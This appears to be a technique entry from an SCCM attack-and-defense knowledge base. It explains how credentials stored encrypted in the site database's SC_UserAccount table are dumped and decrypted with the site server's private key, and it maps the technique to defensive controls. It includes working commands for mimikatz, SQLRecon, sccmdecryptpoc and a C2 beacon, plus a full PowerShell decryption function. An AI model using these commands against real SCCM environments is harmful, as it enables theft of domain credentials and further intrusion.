# CRED-5

## Description
Dump credentials from the site database

## MITRE ATT&CK TTPs
- [TA0006 - Credential Access](https://attack.mitre.org/tactics/TA0006)
- [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/)

## Requirements
- Site database access
- Access to the private key used for encryption stored on the primary site server

## Summary
SCCM uses many different accounts for various purposes (e.g., network access accounts, domain join accounts, client push installation accounts, etc.). All of these credentials are stored in the `SC_UserAccount` table in the site MSSQL database as hex-encoded, encrypted blobs. The secrets in this table are encrypted with an RSA private key which is stored in the "Microsoft Systems Management Server" cryptographic service provider (CSP) container on the primary site server *for the site the account was added to*. 

For example, if there are two primary sites, `PS1` and `PS2`, and a network access account was added to `PS1`, the credentials can be decrypted by the primary site server for `PS1`, but not the site server for `PS2`. If a client push installation account is subsequently added to `PS2`, it cannot be decrypted using the key on the `PS1` site server and can only be decrypted on the `PS2` site server.

From the site server, which is granted the `sysadmin` role on the site database, it is possible to query the `SC_UserAccount` table for usernames and passwords and decrypt the blobs using this private key. Alternatively, this table can be read to obtain the blobs for later offline decryption on the site server or with the stolen private key. This is particularly dangerous if the database is compromised through some attack path where SCCM credentials may not yet have been compromised, such as SQL links.

## Impact
If an attacker can compromise the primary site server, they can recover plaintext credentials for any account stored in the site database.

## Defensive IDs
- [CANARY-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/CANARY/CANARY-1/canary-1_description.md)
- [PREVENT-3: Harden or disable network access accounts](../../../defense-techniques/PREVENT/PREVENT-3/prevent-3_description.md)
- [PREVENT-10: Enforce the principle of least privilege for accounts](../../../defense-techniques/PREVENT/PREVENT-10/prevent-10_description.md)
- [PREVENT-17: Remove unnecessary privileges from accounts](../../../defense-techniques/PREVENT/PREVENT-17/prevent-17_description.md)
- [PREVENT-18: Use strong passwords for DBA accounts](../../../defense-techniques/PREVENT/PREVENT-18/prevent-18_description.md)
- [PREVENT-19: Remove unnecessary links to site databases](../../../defense-techniques/PREVENT/PREVENT-19/prevent-19_description.md)
- [PREVENT-20: Block unnecessary connections to site systems](../../../defense-techniques/PREVENT/PREVENT-20/prevent-20_description.md)
- [PREVENT-22: Do not manage assets in two or more segmented forests, domains, networks, or security tiers](../../../defense-techniques/PREVENT/PREVENT-22/prevent-22_description.md)

## Examples

#### Mimikatz (C)
Benjamin Delpy's mimikatz `misc::sccm` [command](https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/kuhl_m_misc.c#L33) was the first command that could be run on a primary site server that also hosted the site database to retrieve the blobs from the database and decrypt them.

```
mimikatz # misc::sccm /connectionstring:"DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;"
[CRYPTO] Private Key Container: Microsoft Systems Management Server (machine)
[ SQL  ] ConnectionString: DRIVER={SQL Server};Trusted=true;DATABASE=ConfigMgr_CHQ;SERVER=CM1;
[ SQL  ] Query to accounts: SELECT SiteNumber, UserName, Password, Availability FROM SC_UserAccount
[CRYPTO] Acquiring local SCCM RSA Private Key

[1-0] CORP\CM_NetAcc - [CALG_AES_256] P@ssw0rd
[1-0] CORP\LabAdmin - [CALG_AES_256] P@ssw0rd
[1-0] CORP\CM_RS - [CALG_AES_256] P@ssw0rd

[CRYPTO] Releasing local SCCM RSA Private Key
```

Since then, several ports have been created by other tool authors.

#### SQLRecon (C#)
Sanjiv Kawa's `SQLRecon` can be run on a primary site server that also hosts the site database to retrieve the blobs from the database and decrypt them:

```
SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials
[*] Identified vaulted SCCM credential:
 |-> Username: CORP\CM_NetAcc
 |-> Password: P@ssw0rd

[*] Identified vaulted SCCM credential:
 |-> Username: CORP\LabAdmin
 |-> Password: P@ssw0rd
 |-> Function: SMS_AD_SECURITY_GROUP_DISCOVERY_AGENT
 |-> Function: SMS_AD_SYSTEM_DISCOVERY_AGENT
 |-> Function: SMS_AD_USER_DISCOVERY_AGENT
 |-> Function: SMS_CLIENT_CONFIG_MANAGER
 |-> Function: Software Distribution

[*] Identified vaulted SCCM credential:
 |-> Username: CORP\CM_RS
 |-> Password: P@ssw0rd
```

Note that this command will not work when the site server and database are hosted on separate systems.

In these cases, run:
```
SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> /module:query /command:"SELECT * FROM SC_UserAccount"
[*] Executing 'SELECT * FROM SC_UserAccount' on SITE-DB
ID | SiteNumber | UserName | Password | Availability |
-------------------------------------------------------
72057594037927937 | 1 | MAYYHEM\clientpush | 0C01000008000000010200001066000000A40000DC0179CE1BAE4E3922075FDCC257AC09A729F2BE5BF6240DF3FBA2DAA00AF28FDADEDA33297CC4CF9880B4FF5CC5CE1436BBAE4FF2B2DF08D8A7A74CB58D60E3524F8C0D0A93F62A064AFD4A9418F5FC72B2400507F4354398D66CD945C5B87AF7AF33299DD916EB474C4F92E50FF2809207841C83F678FED2094677F1D0D258AE3F6FF778A1F854B7B23B3634C05E5FDC635CCF7A4CC1F8946B84F8871FF82BA68322D6879781F69E99325CD7D8FBF61A3C894755592BA9182BC4E30E3328D0336559F92C206F43408F7A6D5FAF7E26C5E4B7820C60EECB8E01B979D71316D12B8D5CF4050A1249A35233E7CB9A65F6F467A5A3E05EB0ECB7496E66057B8764B9D538731F631C01E57D775738E5D6F0 | 0 |
```

The SQLRecon `DecryptCredentials` module can be used to decrypt the credentials.

#### SCCMDecryptPoc (C#)
Alternatively, use Adam Chester's `sccmdecryptpoc.cs` [gist](https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1) to decrypt the blobs from the site server in the context of a member of the local Administrators group. 

```
sccmdecryptpoc.exe 0C01000008000000010200001066000000A40000DC0179CE1BAE4E3922075FDCC257AC09A729F2BE5BF6240DF3FBA2DAA00AF28FDADEDA33297CC4CF9880B4FF5CC5CE1436BBAE4FF2B2DF08D8A7A74CB58D60E3524F8C0D0A93F62A064AFD4A9418F5FC72B2400507F4354398D66CD945C5B87AF7AF33299DD916EB474C4F92E50FF2809207841C83F678FED2094677F1D0D258AE3F6FF778A1F854B7B23B3634C05E5FDC635CCF7A4CC1F8946B84F8871FF82BA68322D6879781F69E99325CD7D8FBF61A3C894755592BA9182BC4E30E3328D0336559F92C206F43408F7A6D5FAF7E26C5E4B7820C60EECB8E01B979D71316D12B8D5CF4050A1249A35233E7CB9A65F6F467A5A3E05EB0ECB7496E66057B8764B9D538731F631C01E57D775738E5D6F0
[*] Key Length: 268
[*] Expecting Decrypted Length Of: 8
[*] Decrypted Input as: P@ssw0rd
```

#### PowerShell (.NET Framework)
There is also a .NET Framework binary that ships with ConfigMgr (Microsoft.ConfigurationManager.ManagedBase.dll) that exports a `SiteCrypto.Decrypt` function that can be executed on a site server to decrypt secrets stored in the site database:

```
# Load the DLL
Add-Type -Path "C:\Program Files\Microsoft Configuration Manager\bin\X64\Microsoft.ConfigurationManager.ManagedBase.dll"

function Invoke-Decrypt {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$Hex,
        
        [Parameter(Mandatory = $false)]
        [switch]$UseSiteSystemKey = $false
    )
    try {
        $encryptedData = $Hex
        $decryptedData = New-Object System.Security.SecureString
        $traceInfo = ""

        $result = [Microsoft.ConfigurationManager.ManagedBase.SiteCrypto]::Decrypt(
            $UseSiteSystemKey,
            $encryptedData,
            [ref]$decryptedData,
            [ref]$traceInfo
        )

        if ($result) {
            # Convert SecureString to plain text
            return [Microsoft.ConfigurationManager.ManagedBase.SiteCrypto]::ToUnsecureString($decryptedData)
        } else {
            throw "Decryption failed. Trace info: $traceInfo"
        }
    } catch {
        Write-Error $_
        $PSCmdlet.ThrowTerminatingError($_)
    }
}

# Example usage
Invoke-Decrypt -Hex "0C0100000B000000010200000...3C39"
```

Note that the script above will not work in hierarchies configured with a passive site server as different keys appear to be used for encryption and are not accessible in this function.

#### SCCMDecryptor-BOF
There is also a beacon object file (BOF) [implementation](https://github.com/NocteDefensor/SCCMDecryptor-BOF) of Adam's Chester's  `sccmdecryptpoc.cs` that can be run in your BOF capable C2 beacon of choice in a local administrative context on the site server.
```
beacon> sccmdecrypt <hex_string>
```
## References
- Benjamin Delpy, https://x.com/gentilkiwi/status/1392204021461569537?s=20
- Benjamin Delpy, [mimikatz](https://github.com/gentilkiwi/mimikatz)
- Adam Chester, https://twitter.com/_xpn_/status/1543682652066258946
- Adam Chester, [sccmdecryptpoc.cs](https://gist.github.com/xpn/5f497d2725a041922c427c3aaa3b37d1)
- Sanjiv Kawa, [SQLRecon](https://github.com/skahwah/SQLRecon)
- Marshall Price, [SCCMDecryptor-BOF](https://github.com/NocteDefensor/SCCMDecryptor-BOF)
